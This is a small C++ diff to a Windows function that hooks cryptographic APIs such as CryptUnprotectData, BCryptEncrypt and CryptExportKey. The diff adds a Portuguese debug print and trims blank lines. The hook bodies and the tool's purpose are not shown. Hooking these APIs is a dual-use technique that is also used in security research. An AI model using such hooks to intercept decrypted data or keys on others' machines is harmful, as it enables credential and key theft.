@@ -247,6 +247,8 @@ void hookCryptExportKey(FARPROC addr) {
 
 void hookCrypto()
 {
+    std::cout << "Aqui pegou";
+
     FARPROC procAddress = GetProcAddress(GetModuleHandle(TEXT("crypt32")), "CryptUnprotectData");
     hookCryptUnprotectData(procAddress);
     procAddress = GetProcAddress(GetModuleHandle(TEXT("bcrypt")), "BCryptEncrypt");
@@ -258,7 +260,3 @@ void hookCrypto()
     procAddress = GetProcAddress(GetModuleHandle(TEXT("advapi32")), "CryptExportKey");
     hookCryptExportKey(procAddress);
 }
-
-
-
-
